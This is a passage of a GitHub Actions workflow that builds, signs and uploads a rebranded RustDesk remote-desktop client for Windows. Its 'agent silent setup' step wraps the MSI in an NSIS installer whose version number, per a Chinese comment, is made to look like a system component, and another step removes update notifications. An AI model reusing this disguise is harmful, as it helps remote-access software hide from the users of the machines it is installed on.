              $iconUrl = "https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/agent_icon.png?nc=${{ github.run_id }}"
            }
            Invoke-WebRequest -Uri $iconUrl -OutFile ./res/iconx.png
            mv ./res/icon.ico ./res/icon.ico.bak
            mv ./res/icon.png ./res/icon.png.bak
            mv ./res/tray-icon.ico ./res/tray-icon.ico.bak
            mv ./res/iconx.png ./res/icon.png
            mv ./res/32x32.png ./res/32x32.png.bak
            mv ./res/64x64.png ./res/64x64.png.bak
            mv ./res/128x128.png ./res/128x128.png.bak
            mv ./res/128x128@2x.png ./res/128x128@2x.png.bak
            # every size Windows asks for at 100-200% scaling, so it never rescales on the fly
            magick ./res/icon.png -define icon:auto-resize=256,128,96,64,48,40,32,24,20,16 ./res/icon.ico
            # the tray decodes the largest entry of this file, so keep it a single 32x32 like upstream
            # (a 256 entry here is shrunk to 16-24 px by the shell and comes out jagged)
            magick ./res/icon.png -resize 32x32 ./res/tray-icon.ico
            magick ./res/icon.png -resize 32x32 ./res/32x32.png
            magick ./res/icon.png -resize 64x64 ./res/64x64.png
            magick ./res/icon.png -resize 128x128 ./res/128x128.png
            magick ./res/icon.png -resize 256x256 ./res/128x128@2x.png


      - name: ui.rs icon
        if: true  # 图标固定走 rdgen 仓库 patches/icon.png
        continue-on-error: true
        shell: bash
        run: |
          IMAGE_PATH="./res/icon.png"
          if [ ! -f "$IMAGE_PATH" ]; then
            echo "Error: Image file '$IMAGE_PATH' not found or is a directory."
            exit 1
          fi
          b64=$(base64 -w0 "$IMAGE_PATH")
          perl -0777 -pe "s|iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHL[A-Za-z0-9+/=]+|$b64|g" -i.bak ./src/ui.rs
          b64=""

      - name: fix connection delay
        continue-on-error: true
        if: ${{ env.delayFix == 'true' }}
        shell: bash
        run: |
          # Precise fix: only extend the direct-connection condition with the
          # key check, instead of globally replacing !key.is_empty() with
          # false (which would also disable TCP encryption and UDP logic).
          sed -i -e 's#if is_local || peer_nat_type == NatType::SYMMETRIC {#if is_local || peer_nat_type == NatType::SYMMETRIC || !key.is_empty() {#' ./src/client.rs
          grep -n "key.is_empty()" ./src/client.rs || true

      - name: use X for offline display instead of orange circle
        if: env.xOffline == 'true'
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 5
          max_attempts: 3
          retry_wait_seconds: 15
          shell: pwsh
          continue_on_error: true
          command: |
            Invoke-WebRequest -Uri https://raw.githubusercontent.com/bryangerlach/rdgen/refs/heads/master/.github/patches/xoffline.diff -OutFile xoffline.diff
            git apply xoffline.diff

      - name: removeNewVersionNotif
        continue-on-error: true
        if: env.removeNewVersionNotif == 'true'
        shell: bash
        run: | 
          sed -i -e 's|updateUrl.isNotEmpty|false|' ./flutter/lib/desktop/pages/desktop_home_page.dart
          sed -i '/let (request, url) =/,/Ok(())/{/Ok(())/!d}' ./src/common.rs

      # - name: run as admin
      #   continue-on-error: true
      #   if: ${{ env.runasadmin == 'true' }}
      #   shell: bash
      #   run: |
      #     sed -i '/<\/compatibility>/a \
      #           <security> \
      #             <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/> \
      #           </security>' ./flutter/windows/runner/runner.exe.manifest

      - name: replace flutter icons
        if: true  # 图标固定走 rdgen 仓库 patches/icon.png
        continue-on-error: true
        run: |
          cd ./flutter
          #flutter pub upgrade win32
          flutter pub get
          flutter pub run flutter_launcher_icons
          # flutter_launcher_icons writes app_icon.ico with a single 48x48 image, which the taskbar,
          # the exe and the shortcuts then rescale; use the multi-size icon instead
          cp ../res/icon.ico ./windows/runner/resources/app_icon.ico
          cd ..

      - name: Checkout printer-adapter crate
        uses: actions/checkout@v4
        with:
          repository: bryangerlach/rdgen
          ref: master
          path: ./temp-repo

      - name: Move printer-adapter into place
        shell: pwsh
        run: |
          if (Test-Path "./temp-repo/printer-adapter") {
            Move-Item -Path "./temp-repo/printer-adapter" -Destination "./printer-adapter" -Force
            Remove-Item -Recurse -Force "./temp-repo"
            Write-Host "Successfully placed printer-adapter into workspace."
          } else {
            Write-Host "Error: printer-adapter folder not found in repository."
          }

      - name: Build rustdesk
        run: |
          # Windows: build RustDesk
          python3 .\build.py --portable --flutter --skip-portable-pack --hwcodec ${{ matrix.job.build-args }}
          mv ./flutter/build/windows/x64/runner/Release ./rustdesk
 
          # Download usbmmidd_v2.zip and extract it to ./rustdesk
          Invoke-WebRequest -Uri https://github.com/rustdesk-org/rdev/releases/download/usbmmidd_v2/usbmmidd_v2.zip -OutFile usbmmidd_v2.zip
          Expand-Archive usbmmidd_v2.zip -DestinationPath . -Force
          Remove-Item -Path usbmmidd_v2\Win32 -Recurse
          Remove-Item -Path "usbmmidd_v2\deviceinstaller64.exe", "usbmmidd_v2\deviceinstaller.exe", "usbmmidd_v2\usbmmidd.bat"
          mv -Force .\usbmmidd_v2 ./rustdesk   

          # Download and install driver package
          try {
            Invoke-WebRequest -Uri https://github.com/rustdesk/hbb_common/releases/download/driver/rustdesk_printer_driver_v4-1.4.zip -OutFile rustdesk_printer_driver_v4-1.4.zip
            Expand-Archive rustdesk_printer_driver_v4-1.4.zip -DestinationPath .
            mkdir ./rustdesk/drivers -ErrorAction SilentlyContinue
            mv -Force .\rustdesk_printer_driver_v4-1.4 ./rustdesk/drivers/RustDeskPrinterDriver
          } catch {
            Write-Host "Warning: Printer driver download failed."
          }

          # Build and install open printer adapter
          if (Test-Path "./printer-adapter/Cargo.toml") {
            Write-Host "Building open printer-adapter..."
            pushd ./printer-adapter
            cargo build --release --locked
            popd
            if (Test-Path "./printer-adapter/target/release/printer_driver_adapter.dll") {
              cp -Force "./printer-adapter/target/release/printer_driver_adapter.dll" "./rustdesk/printer_driver_adapter.dll"
              Write-Host "Replaced printer_driver_adapter.dll with open implementation."
            } else {
              Write-Host "Error: printer-adapter build succeeded but DLL was not found."
            }
          } else {
            Write-Host "Warning: ./printer-adapter/Cargo.toml not found, remote printing will remain disabled."
          }

      - name: icon stuff
        if: true  # 图标固定走 rdgen 仓库 patches/icon.png
        continue-on-error: true
        run: |
          mv ./rustdesk/data/flutter_assets/assets/icon.svg ./rustdesk/data/flutter_assets/assets/icon.svg.bak
          magick ./res/icon.png ./rustdesk/data/flutter_assets/assets/icon.svg
          # assets/icon.png is loaded before icon.svg (which above only wraps the 256 px png) by the
          # title bar (16 px), the connection manager (30 px) and the tray; 48 px serves all three
          # with at most a 3x downscale. icon.ico is picked up for the shortcuts.
          magick ./res/icon.png -resize 48x48 ./rustdesk/data/flutter_assets/assets/icon.png
          cp ./res/icon.ico ./rustdesk/data/flutter_assets/assets/icon.ico

      - name: logo stuff
        if: ${{ env.logolink_url != 'false' }}
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 5
          max_attempts: 3
          retry_wait_seconds: 15
          shell: pwsh
          continue_on_error: true
          command: |
            Invoke-WebRequest -Uri ${{ env.logolink_url }}/get_png?filename=${{ env.logolink_file }}"&"uuid=${{ env.logolink_uuid }} -OutFile ./rustdesk/data/flutter_assets/assets/logo.png

      - name: find Runner.res
        # Windows: find Runner.res (compiled from ./flutter/windows/runner/Runner.rc), copy to ./Runner.res
        # Runner.rc does not contain actual version, but Runner.res does
        continue-on-error: true
        shell: bash
        run: |
          runner_res=$(find . -name "Runner.res");
          if [ "$runner_res" == "" ]; then
            echo "Runner.res: not found";
          else
            echo "Runner.res: $runner_res";
            cp $runner_res ./libs/portable/Runner.res;
            echo "list ./libs/portable/Runner.res";
            ls -l ./libs/portable/Runner.res;
          fi

      - name: Download RustDeskTempTopMostWindow artifacts
        uses: actions/download-artifact@master
        if: env.UPLOAD_ARTIFACT == 'true'
        with:
          name: topmostwindow-artifacts
          path: "./rustdesk"
      
      - name: zip dlls
        continue-on-error: true
        shell: pwsh
        run: |
          Compress-Archive -Path ./rustdesk/*.dll, ./rustdesk/*.exe -DestinationPath ./rustdesk/unsigned_files.zip -CompressionLevel Fastest

      - name: sign dlls
        continue-on-error: true
        shell: bash
        run: |
          if [ ! -z "${{ secrets.SIGN_BASE_URL }}" ] && [ ! -z "${{ secrets.SIGN_API_KEY }}" ]; then
            curl -X POST -F "file=@./rustdesk/unsigned_files.zip" \
              -H "X-API-KEY: ${{ secrets.SIGN_API_KEY }}" \
              -m 900 \
              "${{ secrets.SIGN_BASE_URL }}/sign/" -o ./rustdesk/signed_files.zip
          else
            echo "Signing skipped - signing URL or API key not configured"
            cp ./rustdesk/unsigned_files.zip ./rustdesk/signed_files.zip
          fi

      - name: unzip dlls
        continue-on-error: true
        shell: pwsh
        run: |
          Expand-Archive -Path ./rustdesk/signed_files.zip -DestinationPath ./rustdesk/ -Force
          Remove-Item ./rustdesk/unsigned_files.zip
          Remove-Item ./rustdesk/signed_files.zip

      - name: Create custom.txt file
        shell: bash
        run: |
          echo -n "${{ env.custom }}" | cat > ./rustdesk/custom_.txt

      - name: Build self-extracted executable
        shell: bash
        if: env.UPLOAD_ARTIFACT == 'true'
        run: |
          mv "./rustdesk/rustdesk.exe" "./rustdesk/${{ env.appname }}.exe" || echo "rustdesk.exe"
          sed -i '/dpiAware/d' res/manifest.xml
          pushd ./libs/portable
          pip3 install -r requirements.txt
          python3 ./generate.py -f ../../rustdesk/ -o . -e "../../rustdesk/${{ env.appname }}.exe"
          popd
          mkdir -p ./SignOutput
          mv ./target/release/rustdesk-portable-packer.exe "./SignOutput/rustdesk.exe"

      - name: Add MSBuild to PATH
        uses: microsoft/setup-msbuild@v2

      - name: Build msi
        continue-on-error: true
        if: env.UPLOAD_ARTIFACT == 'true'
        env:
          VERSION: ${{ env.MSI_VERSION }}
        run: |
          pushd ./res/msi
          python preprocess.py --app-name "${{ env.appname }}" --arp -d ../../rustdesk
          nuget restore msi.sln
          msbuild msi.sln -p:Configuration=Release -p:Platform=x64 /p:TargetVersion=Windows10
          cp ./Package/bin/x64/Release/en-us/Package.msi ../../SignOutput/rustdesk-latest.msi
          mv ./Package/bin/x64/Release/en-us/Package.msi ../../SignOutput/rustdesk.msi
          sha256sum ../../SignOutput/rustdesk.msi
          test -f ../../SignOutput/rustdesk.msi || echo "::warning::MSI was not produced - check restore / WiX build"

      - name: zip exe and msi
        continue-on-error: true
        shell: pwsh
        run: |
          Compress-Archive -Path ./SignOutput/*.exe, ./SignOutput/*.msi -DestinationPath ./SignOutput/unsigned_files.zip -CompressionLevel Fastest

      - name: sign exe and msi
        continue-on-error: true
        shell: bash
        run: |
          if [ ! -z "${{ secrets.SIGN_BASE_URL }}" ] && [ ! -z "${{ secrets.SIGN_API_KEY }}" ]; then
            curl -X POST -F "file=@./SignOutput/unsigned_files.zip" \
              -H "X-API-KEY: ${{ secrets.SIGN_API_KEY }}" \
              -m 900 \
              "${{ secrets.SIGN_BASE_URL }}/sign/" -o ./SignOutput/signed_files.zip
          else
            echo "Signing skipped - signing URL or API key not configured"
            cp ./SignOutput/unsigned_files.zip ./SignOutput/signed_files.zip
          fi

      - name: unzip exe and msi
        continue-on-error: true
        shell: pwsh
        run: |
          Expand-Archive -Path ./SignOutput/signed_files.zip -DestinationPath ./SignOutput/ -Force
          Remove-Item ./SignOutput/unsigned_files.zip
          Remove-Item ./SignOutput/signed_files.zip

      - name: rename rustdesk.exe to filename.exe
        run: |
          mv ./SignOutput/rustdesk.exe "./SignOutput/${{ env.filename }}.exe" || echo "rustdesk"

      - name: rename rustdesk.msi to filename.msi
        continue-on-error: true
        run: |
          mv ./SignOutput/rustdesk.msi "./SignOutput/${{ env.filename }}.msi" || echo "rustdesk"

      - name: Build agent silent setup shell (NSIS)
        if: ${{ inputs.agentui == '1' && env.UPLOAD_ARTIFACT == 'true' }}
        continue-on-error: true
        shell: bash
        run: |
          set -e
          choco install nsis -y --no-progress || true
          MAKE="/c/Program Files (x86)/NSIS/makensis.exe"
          [ -f "$MAKE" ] || MAKE="makensis"
          curl -sSL -o agent_setup.nsi \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/agent_setup.nsi?nc=${{ github.run_id }}
          magick ./res/icon.png -define icon:auto-resize=256,128,64,48,32,16 agent_setup.ico
          # 4 段版本号：MSI_VERSION 形如 1.5.26 -> 10.5.26.0，看起来像系统组件版本
          VER4="10.0.0.1"
          if [[ "${{ env.MSI_VERSION }}" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            VER4="10.$( echo '${{ env.MSI_VERSION }}' | cut -d. -f2 ).$( echo '${{ env.MSI_VERSION }}' | cut -d. -f3 ).0"
          fi
          # NSIS File 指令不解析相对路径（实测 no files found），必须注入绝对 Windows 路径
          MSI_WIN=$(cygpath -w "$(pwd)/SignOutput/${{ env.filename }}.msi")
          # 注意：nsi 必须保持纯 ASCII 且“无 BOM”，UTF-8 BOM 会被 makensis 当成非法命令(?;)
          python -c "import sys; raw = open('agent_setup.nsi','rb').read().lstrip(b'\xef\xbb\xbf'); src = raw.decode('ascii'); src = src.replace('__PRODUCT__', sys.argv[2]).replace('__MSI__', sys.argv[1]).replace('__VER4__', sys.argv[3]).replace('__COMPANY__', sys.argv[4]); open('agent_setup.nsi','w',encoding='ascii',newline='\n').write(src); print('nsi placeholders replaced; msi =', sys.argv[1])" "$MSI_WIN" "${{ env.appname }}" "$VER4" "${{ env.compname }}"
          # 复核文件头干净（BOM 或中文都会让 makensis 报 Invalid command）
          head -c 3 agent_setup.nsi | od -An -tx1 | grep -q "ef bb bf" && { echo "nsi has BOM, aborting"; exit 1; } || true
          grep -n "__PRODUCT__\|__MSI__\|__VER4__\|__COMPANY__" agent_setup.nsi && { echo "placeholder left unreplaced"; exit 1; } || true
          "$MAKE" agent_setup.nsi
          mv "${{ env.appname }}_Setup.exe" "./SignOutput/${{ env.filename }}_Setup.exe"
          # 壳本身也过一遍签名服务（内容 msi 已是签名版）
          if [ ! -z "${{ secrets.SIGN_BASE_URL }}" ] && [ ! -z "${{ secrets.SIGN_API_KEY }}" ]; then
            powershell -Command "Compress-Archive -Path './SignOutput/${{ env.filename }}_Setup.exe' -DestinationPath ./SignOutput/wrap_unsigned.zip -CompressionLevel Fastest"
            curl -X POST -F "file=@./SignOutput/wrap_unsigned.zip" \
              -H "X-API-KEY: ${{ secrets.SIGN_API_KEY }}" -m 900 \
              "${{ secrets.SIGN_BASE_URL }}/sign/" -o ./SignOutput/wrap_signed.zip
            powershell -Command "Expand-Archive -Path ./SignOutput/wrap_signed.zip -DestinationPath ./SignOutput/ -Force; Remove-Item ./SignOutput/wrap_unsigned.zip, ./SignOutput/wrap_signed.zip -ErrorAction SilentlyContinue"
          fi
          ls -la ./SignOutput/

      - name: send file to rdgen server
        if: ${{ env.rdgen == 'true' }}
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 10
          max_attempts: 3
          retry_wait_seconds: 15
          shell: bash
          command: |
            curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.exe" -F "uuid=${{ env.uuid }}" ${{ secrets.GENURL }}/save_custom_client
            curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.msi" -F "uuid=${{ env.uuid }}" ${{ secrets.GENURL }}/save_custom_client || true
            if [ -f "./SignOutput/${{ env.filename }}_Setup.exe" ]; then
              curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}_Setup.exe" -F "uuid=${{ env.uuid }}" ${{ secrets.GENURL }}/save_custom_client || true
            fi

      - name: send file to api server
        if: ${{ env.rdgen == 'false' }}
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 10
          max_attempts: 3
          retry_wait_seconds: 15
          shell: bash
          command: |
            curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.exe" ${{ env.apiServer }}/api/save_custom_client
            curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.msi" ${{ env.apiServer }}/api/save_custom_client || true
            if [ -f "./SignOutput/${{ env.filename }}_Setup.exe" ]; then
              curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}_Setup.exe" ${{ env.apiServer }}/api/save_custom_client || true
            fi

  cleanup:
    needs: [build-for-windows-flutter]
    runs-on: ubuntu-latest
    continue-on-error: true
    if: always()
    steps:
      - name: Delete secrets artifact
        uses: geekyeggo/delete-artifact@v5
        with:
          name: encrypted-secrets-zip

